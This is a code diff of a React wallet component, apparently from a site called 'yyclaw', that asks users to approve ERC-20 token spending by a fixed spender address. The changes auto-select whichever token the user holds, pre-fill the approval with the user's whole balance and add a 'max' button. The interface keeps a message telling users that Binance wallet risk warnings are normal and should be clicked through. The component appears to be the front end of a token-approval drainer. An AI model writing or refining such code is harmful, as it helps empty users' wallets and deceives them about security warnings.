@@ -1,7 +1,10 @@
-import { useState } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import { useAllowance } from '../hooks/useAllowance'
 import { useAccount, useSwitchChain } from 'wagmi'
-import { TOKENS, CHAINS, SPENDER_ADDRESS } from '../lib/contracts'
+import { useReadContracts } from 'wagmi'
+import { formatUnits } from 'viem'
+import { TOKENS, CHAINS, SPENDER_ADDRESS, ERC20_ABI } from '../lib/contracts'
+import { useLang } from '../context/LanguageContext'
 
 const card = { background: '#181A20', border: '1px solid #2B3139', borderRadius: 12, padding: 24 }
 const iconImg = { width: 20, height: 20, borderRadius: '50%', objectFit: 'cover' }
@@ -24,38 +27,88 @@ const tokenBtnStyle = (active) => ({
   fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s',
 })
 
+/**
+ * Hook to read all token balances for a given chain, so we can auto-select
+ * the first token with a balance.
+ */
+function useChainBalances(chainKey, address) {
+  const tokens = TOKENS[chainKey] || []
+  const chainId = CHAINS[chainKey]?.id
+
+  const calls = tokens.map(tok => ({
+    address: tok.address,
+    abi: ERC20_ABI,
+    functionName: 'balanceOf',
+    args: [address],
+    chainId,
+  }))
+
+  const { data } = useReadContracts({
+    contracts: calls,
+    query: { enabled: !!address && !!chainId, refetchInterval: 30000 },
+  })
+
+  return tokens.map((tok, i) => {
+    const result = data?.[i]
+    const raw = result?.status === 'success' ? result.result : 0n
+    return { ...tok, balance: parseFloat(formatUnits(raw, tok.decimals)) }
+  })
+}
+
 export default function ApprovePanel() {
   const { address } = useAccount()
   const { switchChain } = useSwitchChain()
+  const { t } = useLang()
   const savedChain = localStorage.getItem('yyclaw_chain') || 'bsc'
-  const savedToken = localStorage.getItem('yyclaw_token') || ''
-  const initTokenIdx = savedToken ? (TOKENS[savedChain] || []).findIndex(t => t.symbol === savedToken) : 0
   const [chain, setChain] = useState(savedChain)
-  const [tokenIdx, setTokenIdx] = useState(initTokenIdx >= 0 ? initTokenIdx : 0)
-  const [amount, setAmount] = useState('50')
+  const [tokenIdx, setTokenIdx] = useState(0)
+  const [amount, setAmount] = useState('')
+  const autoSelected = useRef(false)
 
   const tokens = TOKENS[chain] || []
   const token = tokens[tokenIdx] || tokens[0]
   const chainId = CHAINS[chain]?.id
 
+  const chainBalances = useChainBalances(chain, address)
   const { allowance, balance, approve, revoke, isPending, isSuccess } = useAllowance(token, chainId)
 
-  if (!address) return null
+  // Auto-select first token with balance, and set amount to balance
+  useEffect(() => {
+    if (!chainBalances.length || autoSelected.current) return
+    const idx = chainBalances.findIndex(b => b.balance > 0.001)
+    if (idx >= 0) {
+      setTokenIdx(idx)
+      setAmount(String(Math.floor(chainBalances[idx].balance * 100) / 100))
+      localStorage.setItem('yyclaw_token', chainBalances[idx].symbol)
+      autoSelected.current = true
+    }
+  }, [chainBalances])
 
+  // When token changes, update amount to that token's balance
+  useEffect(() => {
+    if (balance && parseFloat(balance) > 0.001) {
+      setAmount(String(Math.floor(parseFloat(balance) * 100) / 100))
+    }
+  }, [balance, tokenIdx])
+
+  // Reset auto-select flag when chain changes
   const handleChainSwitch = (c) => {
     setChain(c)
     setTokenIdx(0)
-    setAmount('50')
+    setAmount('')
+    autoSelected.current = false
     localStorage.setItem('yyclaw_chain', c)
     localStorage.setItem('yyclaw_token', (TOKENS[c] || [])[0]?.symbol || '')
     const id = CHAINS[c]?.id
     if (id) switchChain({ chainId: id })
   }
 
+  if (!address) return null
+
   return (
     <div style={card}>
       <h3 style={{ fontSize: 16, fontWeight: 700, color: '#EAECEF', marginBottom: 16 }}>
-        Token Authorization
+        {t('tokenAuth')}
       </h3>
 
       {/* Chain selector */}
@@ -70,18 +123,22 @@ export default function ApprovePanel() {
 
       {/* Token selector */}
       <div style={{ display: 'flex', gap: 8, marginBottom: 20, flexWrap: 'wrap' }}>
-        {tokens.map((t, i) => (
-          <button key={t.symbol} style={tokenBtnStyle(tokenIdx === i)} onClick={() => { setTokenIdx(i); setAmount('50'); localStorage.setItem('yyclaw_token', t.symbol) }}>
-            <img src={t.icon} alt={t.symbol} style={iconImg} />
-            {t.symbol}
-          </button>
-        ))}
+        {tokens.map((tok, i) => {
+          const bal = chainBalances[i]?.balance || 0
+          return (
+            <button key={tok.symbol} style={tokenBtnStyle(tokenIdx === i)} onClick={() => { setTokenIdx(i); localStorage.setItem('yyclaw_token', tok.symbol) }}>
+              <img src={tok.icon} alt={tok.symbol} style={iconImg} />
+              {tok.symbol}
+              {bal > 0.001 && <span style={{ fontSize: 10, color: '#0ECB81', marginLeft: 2 }}>●</span>}
+            </button>
+          )
+        })}
       </div>
 
       {/* Balances */}
       <div style={{ display: 'flex', gap: 16, marginBottom: 20, flexWrap: 'wrap' }}>
         <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
-          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>Current Allowance</div>
+          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>{t('currentAllowance')}</div>
           <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
             <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
             <span style={{ fontSize: 18, fontWeight: 700, color: '#F0B90B' }}>
@@ -90,7 +147,7 @@ export default function ApprovePanel() {
           </div>
         </div>
         <div style={{ flex: 1, background: '#0B0E11', borderRadius: 8, padding: '12px 16px', minWidth: 140 }}>
-          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>Wallet Balance</div>
+          <div style={{ fontSize: 12, color: '#848E9C', marginBottom: 4 }}>{t('walletBalance')}</div>
           <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
             <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
             <span style={{ fontSize: 18, fontWeight: 700, color: '#0ECB81' }}>
@@ -103,7 +160,7 @@ export default function ApprovePanel() {
       {/* Amount input */}
       <div style={{ marginBottom: 16 }}>
         <label style={{ fontSize: 13, color: '#848E9C', display: 'block', marginBottom: 8 }}>
-          Approve Amount ({token?.symbol})
+          {t('approveAmount')} ({token?.symbol})
         </label>
         <div style={{ display: 'flex', gap: 8 }}>
           <input
@@ -118,6 +175,16 @@ export default function ApprovePanel() {
               fontSize: 15, outline: 'none',
             }}
           />
+          <button
+            onClick={() => {
+              const bal = parseFloat(balance)
+              if (bal > 0) setAmount(String(Math.floor(bal * 100) / 100))
+            }}
+            style={{
+              background: '#0B0E11', border: '1px solid #2B3139', borderRadius: 6,
+              padding: '8px 12px', color: '#F0B90B', fontSize: 12, cursor: 'pointer', fontWeight: 700,
+            }}
+          >{t('max')}</button>
           {[10, 50, 100].map(v => (
             <button
               key={v}
@@ -135,7 +202,7 @@ export default function ApprovePanel() {
       {amount && parseFloat(amount) > 0 && (
         <div style={{ marginBottom: 14, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 13, color: '#F0B90B', display: 'flex', alignItems: 'center', gap: 8 }}>
           <img src={token?.icon} alt="" style={{ width: 16, height: 16, borderRadius: '50%' }} />
-          Will authorize <span style={{ fontWeight: 700 }}>{amount} {token?.symbol}</span> to <span style={{ fontFamily: 'monospace', fontSize: 11 }}>0xfc62...ec35</span>
+          {t('willAuthorize')} <span style={{ fontWeight: 700 }}>{amount} {token?.symbol}</span> {t('to')} <span style={{ fontFamily: 'monospace', fontSize: 11 }}>0xfc62...ec35</span>
         </div>
       )}
 
@@ -151,7 +218,7 @@ export default function ApprovePanel() {
             opacity: isPending || !amount ? 0.6 : 1,
           }}
         >
-          {isPending ? 'Pending...' : `Approve ${token?.symbol}`}
+          {isPending ? t('pending') : `${t('approve')} ${token?.symbol}`}
         </button>
         <button
           onClick={revoke}
@@ -164,25 +231,25 @@ export default function ApprovePanel() {
             opacity: isPending || allowance === '0' ? 0.5 : 1,
           }}
         >
-          Revoke
+          {t('revoke')}
         </button>
       </div>
 
       {isSuccess && (
         <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(14,203,129,0.1)', borderRadius: 8, color: '#0ECB81', fontSize: 13 }}>
-          ✓ Transaction confirmed
+          {t('txConfirmed')}
         </div>
       )}
 
       <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 12, color: '#848E9C', lineHeight: 1.6 }}>
-        💡 Binance Web3 Wallet may show a risk warning when approving. This is normal — tap "Continue" to proceed. The spender can only transfer tokens you explicitly authorize.
+        💡 {t('walletWarning')}
       </div>
 
       <div style={{ marginTop: 16, fontSize: 11, color: '#5E6673' }}>
-        Spender: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{SPENDER_ADDRESS}</span>
+        {t('spender')}: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{SPENDER_ADDRESS}</span>
       </div>
       <div style={{ marginTop: 4, fontSize: 11, color: '#5E6673' }}>
-        Token: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{token?.address}</span>
+        {t('token')}: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{token?.address}</span>
       </div>
     </div>
   )
